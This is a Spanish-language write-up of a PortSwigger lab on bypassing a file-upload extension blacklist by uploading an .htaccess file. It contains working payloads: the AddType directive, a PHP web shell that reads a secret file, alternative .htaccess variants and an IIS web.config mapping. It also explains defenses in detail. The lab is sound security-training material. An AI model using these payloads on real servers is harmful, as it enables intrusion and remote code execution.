# Writeup: Web shell upload via extension blacklist bypass (PortSwigger)

- **Lab**: Web shell upload via extension blacklist bypass
- **URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
- **Categoría**: File upload / Extension blacklist bypass / .htaccess abuse / Web shell / RCE
- **Dificultad**: Practitioner
- **Credenciales**: `wiener:peter`

---

## 1. Objetivo

Mismo target (`/home/carlos/secret`), mismo endpoint (`/my-account/avatar`). La defensa: la app valida la extensión por **blacklist** (rechaza `.php`, `.phtml`, y todas las variantes `.ph*` con mensaje "Sorry, php files are not allowed"). Bypass: subir un archivo `.htaccess` que redefine qué extensiones Apache trata como PHP, después subir el webshell con esa extensión arbitraria.

Dos uploads secuenciales:

**Upload 1** — `.htaccess` que mapea `.l33t` a PHP:

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .l33t
```

**Upload 2** — webshell con extensión arbitraria:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Después navegar a `/files/avatars/exploit.l33t`. Apache lee el `.htaccess` del mismo directorio, aplica el `AddType`, procesa `.l33t` con el motor PHP, y devuelve el secret.

### Insight central

**Cuando el server permite subir archivos de configuración del propio server, el atacante redefine las reglas que la defensa asume**. La blacklist de extensiones asume que el conjunto de "extensiones ejecutables" es fijo y conocido. `.htaccess` rompe esa asunción: el atacante agrega cualquier extensión al conjunto ejecutable. La defensa estaba mirando la lista equivocada — no es "qué extensiones son PHP" sino "qué archivos de cualquier tipo pueden cambiar la config del server". Defensa-en-profundidad correcta: blacklist también `.htaccess`/`.htpasswd`/`web.config` (IIS), o mejor aún, deshabilitar `AllowOverride` en Apache para que `.htaccess` no se procese aunque se haya subido.

---

## 2. Recon y resolución

### 2.1 Diagnosticar la blacklist

Login `wiener:peter`. Crear `exploit.php`. Subir con `Content-Type: image/jpeg`. Server responde:

```
HTTP/2 403 Forbidden
Sorry, php files are not allowed
```

Mensaje verbose otra vez: indica que la defensa es por extensión y nombra el target ("php files"). Verificar si la blacklist incluye variantes:

- `exploit.phtml` → mismo mensaje "php files are not allowed". La blacklist es comprensiva, no solo `.php` literal — también captura variantes.

Probable implementación del filter:

```php
$blacklist = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phar', 'pht'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (in_array($ext, $blacklist) || preg_match('/^ph/i', $ext)) {
    die("Sorry, php files are not allowed");
}
```

Probar más variantes (`.php5`, `.phar`) sería consumir tiempo. Mejor saltar a un bypass que no dependa de la blacklist específica: `.htaccess`.

### 2.2 Subir `.htaccess`

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .l33t
```

Server responde 200 OK. La blacklist no incluye `.htaccess` (no es una "php file"). El archivo aterriza en `/files/avatars/.htaccess`.

### 2.3 Subir el webshell con extensión arbitraria

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Server responde 200 OK. La blacklist de "php files" no incluye `.l33t`. Archivo en `/files/avatars/exploit.l33t`.

### 2.4 Ejecutar

Navegar a `/files/avatars/exploit.l33t`. Apache lee el `.htaccess` del directorio, aplica `AddType application/x-httpd-php .l33t`, procesa el archivo con el motor PHP. Body de la response: el secret. Lab solved.

---

## 3. Por qué funciona

### 3.1 ¿Qué es `.htaccess` y por qué Apache lo respeta?

`.htaccess` (hypertext access) es un archivo de configuración por-directorio que Apache lee al servir archivos de ese directorio (y subdirectorios, salvo override). Permite a usuarios sin acceso al config global de Apache modificar el comportamiento de su directorio:

- **AddType / AddHandler**: mapear extensiones a tipos MIME o handlers.
- **RewriteRule**: reescribir URLs (`mod_rewrite`).
- **AuthType / Require**: autenticación HTTP basic.
- **Options**: habilitar/deshabilitar features (Indexes, FollowSymLinks, ExecCGI).
- **Order/Allow/Deny**: ACLs por IP.

Diseñado originalmente para shared hosting donde un cliente no podía editar `httpd.conf`. La feature está **habilitada por default** en muchos stacks (`AllowOverride All` o similar).

El bug: cuando el directorio donde aterrizan uploads de usuarios respeta `.htaccess`, el atacante puede subir uno y reconfigurar Apache para ese directorio. Específicamente puede:

- Mapear extensiones arbitrarias a PHP (este lab).
- Habilitar `Options +Indexes` para listar el directorio (info disclosure).
- Mapear `.html` a PHP (XSS persistente con backend execution).
- `RewriteRule` para esconder el webshell detrás de URLs camufladas.

### 3.2 Anatomía del bug

```php
// Antipatrón - blacklist de extensiones "ejecutables conocidas"
$blacklist_extensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'phar'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (in_array($ext, $blacklist_extensions)) {
    http_response_code(403); die("Sorry, php files are not allowed");
}
move_uploaded_file($_FILES['avatar']['tmp_name'], '/var/www/files/avatars/' . $filename);
```

Apache config:

```apache
# /etc/apache2/sites-enabled/000-default.conf
<Directory /var/www/files/avatars>
    AllowOverride All  # Default! Permite .htaccess
</Directory>
```

Dos asunciones rotas:

1. **"El conjunto de extensiones ejecutables es fijo y conocido"**: el dev mantiene una blacklist con todas las extensiones que Apache mapea a PHP. La asunción se rompe porque Apache permite redefinir esos mapeos vía `.htaccess`. La blacklist correcta no es "qué extensiones son PHP" sino "qué archivos pueden hacer ejecutable cualquier extensión".
2. **"Solo extensiones PHP son peligrosas en uploads"**: el dev piensa "el riesgo es que suban un archivo PHP y el server lo ejecute". Otros archivos peligrosos: `.htaccess` (este lab), `web.config` (IIS, equivalente a `.htaccess`), archivos con BOM o magic bytes que el server interpreta de forma especial, archivos que se referencian desde otras configs.

### 3.3 ¿Por qué este lab es Practitioner y los anteriores Apprentice?

El bypass requiere conocimiento que no se infiere desde el comportamiento de la app:

- **Que existe `.htaccess`** y qué hace (knowledge de Apache).
- **Que `AllowOverride All` está habilitado** en el directorio destino (asunción del lab, pero hay que probar).
- **Que `AddType application/x-httpd-php` es la directiva correcta** (vs `AddHandler`, `SetHandler`).

A diferencia de los labs Apprentice donde el bypass se descubre desde el mensaje de error, este requiere conocer el lenguaje de configuración del server. Es la primera vez en el cluster donde el atacante necesita conocimiento del stack defensivo, no solo del input.

### 3.4 Variantes del bypass `.htaccess`

Si `AddType` no funciona (Apache lo deshabilitó pero permite otras directivas):

```apache
# Variante 1 - SetHandler
<Files "exploit.l33t">
    SetHandler application/x-httpd-php
</Files>

# Variante 2 - AddHandler
AddHandler application/x-httpd-php .l33t

# Variante 3 - rewriting (si SetHandler está bloqueado)
RewriteEngine On
RewriteRule ^exploit\.l33t$ exploit.php [L]
```

Si Apache directamente no lee `.htaccess` (`AllowOverride None`), el `.htaccess` no se aplica. Bypass alternativo: subir el webshell con extensión que el server YA mapea a PHP por config global pero no está en la blacklist.

En IIS el equivalente es `web.config`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
        </handlers>
    </system.webServer>
</configuration>
```

Sube `web.config` con extensión `.config`, después archivos `.config` se procesan como ASP. Misma clase de bug en otra plataforma.

### 3.5 Defensa correcta

```php
// Fix - whitelist de extensiones + magic bytes + filename server-controlled
$allowed_ext = ['jpg', 'jpeg', 'png'];
$ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    http_response_code(400); die("File type not allowed");
}

// Magic bytes
$mime = mime_content_type($_FILES['avatar']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    http_response_code(400); die("File type not allowed");
}

// Filename server-controlled - cierra .htaccess y todos los nombres especiales
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['avatar']['tmp_name'], '/var/www/files/avatars/' . $new_name);
```

Y en Apache config:

```apache
<Directory /var/www/files/avatars>
    AllowOverride None              # .htaccess no se procesa
    Options -ExecCGI                # Sin CGI
    php_flag engine off             # PHP no ejecuta
    AddType text/plain .php .phtml .php5 .phar  # Por las dudas, mapear a texto plano
</Directory>
```

5 capas:
1. **Whitelist de extensión** (no blacklist).
2. **Magic bytes**.
3. **Filename server-controlled**: rename a UUID. Cierra `.htaccess`/`web.config` y cualquier nombre especial.
4. **`AllowOverride None`**: aunque suban `.htaccess`, no se procesa.
5. **Deshabilitar ejecución en el directorio** (defensa-en-profundidad).

La capa 3 (filename server-controlled) cierra **toda la familia de bypasses basados en filename** — extensión alternativa, double extension, null byte, path traversal, archivos con nombres especiales (`.htaccess`, `web.config`).

### 3.6 Patrón estructural común con los labs anteriores del cluster

| Lab | Defensa naïve | Bypass | Asunción rota |
|---|---|---|---|
| `rce-via-web-shell-upload` | ninguna | `exploit.php` | (no hay defensa) |
| `content-type-restriction-bypass` | validar `Content-Type` del part | header → `image/jpeg` | "Content-Type del cliente describe tipo real" |
| `path-traversal` | strip `../` + dir sin scripts | `..%2fexploit.php` | "filename describe nombre, no path" |
| **`extension-blacklist-bypass` (este)** | blacklist de extensiones PHP | `.htaccess` + `.l33t` | "extensiones ejecutables son conjunto fijo y conocido" |

La progresión del cluster: cada lab agrega una capa de defensa naïve que cierra el bypass anterior pero abre uno nuevo. El bypass de este lab requiere conocimiento del server (Apache, `.htaccess`), no solo del input. Es el primer lab Practitioner del cluster.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Subir exploit.php - rechazado 'php files not allowed']
    B[2. Probar .phtml - mismo mensaje, blacklist comprensiva]
    C[3. Estrategia: .htaccess para mapear extension arbitraria a PHP]
    D[4. Subir .htaccess con AddType application/x-httpd-php .l33t]
    E[5. Subir exploit.l33t con webshell]
    F[6. GET /files/avatars/exploit.l33t]
    G[7. Apache aplica .htaccess, ejecuta como PHP]
    H[8. Body = secret]
    I[9. Submit secret - lab solved]

    A --> B --> C --> D --> E --> F --> G --> H --> I
```



Tres ideas:

1. **Blacklist de extensiones asume conjunto fijo de "ejecutables"**: la asunción se rompe cuando el server permite redefinir esos mapeos vía `.htaccess`/`web.config`. La blacklist correcta no es "qué extensiones son PHP" sino "qué archivos pueden cambiar la config del server".
2. **`.htaccess` upload es bug categórico de uploads en Apache**: cualquier directorio que respete `.htaccess` Y acepte uploads de filename del cliente es vulnerable a esta clase de bypass. Defensa primaria: filename server-controlled (rename a UUID). Defensa en config: `AllowOverride None`.
3. **Whitelist > Blacklist en validación de uploads**: enumerar lo permitido es más robusto que enumerar lo prohibido. Whitelist falla cerrada (rechaza desconocido); blacklist falla abierta (acepta desconocido). Cualquier nueva extensión que Apache mapee a PHP rompe la blacklist; la whitelist solo acepta lo que se aprobó explícitamente.

---

## 5. Contramedidas

1. **Whitelist de extensiones permitidas, no blacklist**: enumerar lo aceptado (`['jpg', 'jpeg', 'png', 'gif']`) es más robusto que enumerar lo prohibido. Whitelist falla cerrada (rechaza extensiones desconocidas como `.l33t`, `.phar`, `.htaccess`).
2. **Filename server-controlled (rename a UUID)**: cierra `.htaccess`/`web.config` y todos los nombres especiales del filesystem o web server. La intención del cliente (filename legible) puede guardarse en metadatos separados.
3. **Magic bytes del contenido real**: detecta archivos masquerading (PHP con extensión `.jpg`) que pasan la validación de extensión.
4. **`AllowOverride None` en Apache**: deshabilita el procesamiento de `.htaccess` en el directorio. Aunque suban un archivo con ese nombre, Apache no lo aplica.
5. **Equivalentes en otros servers**: en IIS, blacklist `web.config`. En Nginx, no hay `.htaccess` nativo pero algunos plugins/módulos pueden leer config por-directorio — auditar.
6. **Almacenar uploads fuera del document root**: el web server nunca toca los archivos directamente; un endpoint dedicado los sirve con Content-Type explícito y nunca interpreta el contenido.
7. **Deshabilitar ejecución de scripts en el directorio de uploads**: defensa-en-profundidad (`php_flag engine off`, `Options -ExecCGI`, `AddType text/plain .php`).
8. **Rechazar filenames que empiezan con `.`** (dotfiles): `.htaccess`, `.htpasswd`, `.env`, `.git/*` — todos archivos especiales que rara vez son uploads legítimos.
9. **Tests automatizados con la suite del cluster**: por cada endpoint que acepte uploads, archivos `.htaccess` con `AddType`, `web.config` (IIS), filenames con dotfile, doble extensión, encoding, null bytes. Cualquier respuesta inesperada o ejecución es bug.
10. **Mínimo privilegio del proceso**: el web server no debe poder leer fuera del directorio de assets. Limita el daño si la validación falla.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Web shell upload via extension blacklist bypass*. https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
- PortSwigger Web Security Academy. (s.f.). *File upload vulnerabilities*. https://portswigger.net/web-security/file-upload
- Apache Software Foundation. (s.f.). *Apache HTTP Server — .htaccess files*. https://httpd.apache.org/docs/current/howto/htaccess.html
- Apache Software Foundation. (s.f.). *AllowOverride Directive*. https://httpd.apache.org/docs/current/mod/core.html#allowoverride
- OWASP Foundation. (s.f.). *Unrestricted File Upload*. https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP Foundation. (s.f.). *File Upload Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
- MITRE Corporation. (2024). *CWE-184: Incomplete List of Disallowed Inputs*. https://cwe.mitre.org/data/definitions/184.html
- MITRE Corporation. (2024). *CWE-693: Protection Mechanism Failure*. https://cwe.mitre.org/data/definitions/693.html
- MITRE Corporation. (2024). *ATT&CK Technique T1505.003: Server Software Component — Web Shell*. https://attack.mitre.org/techniques/T1505/003/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Upload Insecure Files*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 10 (Attacking Back-End Components — File Upload Vulnerabilities).
- Inventario interno: [`inventario/04-explotacion/web/explotacion-fileupload.md`](../../../inventario/04-explotacion/web/explotacion-fileupload.md)
- Labs hermanos del cluster:
  - [`learning/portswigger/file-upload-rce-via-web-shell-upload/writeup.md`](../file-upload-rce-via-web-shell-upload/writeup.md)
  - [`learning/portswigger/file-upload-content-type-restriction-bypass/writeup.md`](../file-upload-content-type-restriction-bypass/writeup.md)
  - [`learning/portswigger/file-upload-path-traversal/writeup.md`](../file-upload-path-traversal/writeup.md)
